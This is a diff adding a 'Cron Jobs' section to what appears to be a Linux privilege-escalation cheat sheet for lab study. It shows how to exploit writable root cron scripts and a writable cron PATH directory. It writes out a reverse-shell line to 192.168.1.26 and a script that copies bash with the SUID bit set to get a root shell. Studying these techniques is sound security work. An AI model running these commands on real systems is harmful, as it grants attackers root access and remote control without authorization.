@@ -190,6 +190,57 @@ rpm –qa | grep <program>
  ``` 
 3. Search for the Exploit
   
+## Cron Jobs
+Cron jobs run with the security level of the user who owns them.
+Cron table files (crontabs) store the configuration for cron jobs.
+User crontabs are usually located in /var/spool/cron/ or /var/spool/cron/crontabs/
+The system-wide crontab is located at /etc/crontab.
+If we can write to a program or script which gets run as part of a cron job, we can replace it with our own code.
+```
+cat /etc/crontab
+locate overwrite.sh
+ls -l /usr/local/bin/overwrite.sh
+# -rwxr--rw- 1 root
+```
+Replace the contents of the overwrite.sh file with the following:
+```
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.1.26/53 0>&1
+```
+Cron PATH Environment Variable:  
+The crontab PATH environment variable is by default set to /usr/bin:/bin
+The PATH variable can be overwritten in the crontab file.
+If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job.
+  
+``` 
+./lse.sh -l 1 -i | more
+- can write to any paths present in cron jobs 
+
+cat /etc/crontab
+... 
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/ usr/bin
+...
+* * * * * root overwrite.sh (locate in /usr/local/sbin)
+* * * * * root /usr/local/bin/compress.sh 
+```  
+/home/user directory is searched before any other and overwrite.sh dont specifies an absolute path 
+This means we can simply create the overwrite.sh file in these /home/user directory
+and the cron job should execute that file instead of the original. 
+  
+Create the file overwrite.sh in /home/user with the following contents:
+``` 
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+``` 
+Ensure that overwrite.sh is executable:
+``` 
+chmod +x /home/user/overwrite.sh
+```  
+Execute it 
+``` 
+/tmp/rootbash –p
+``` 
   
   
   
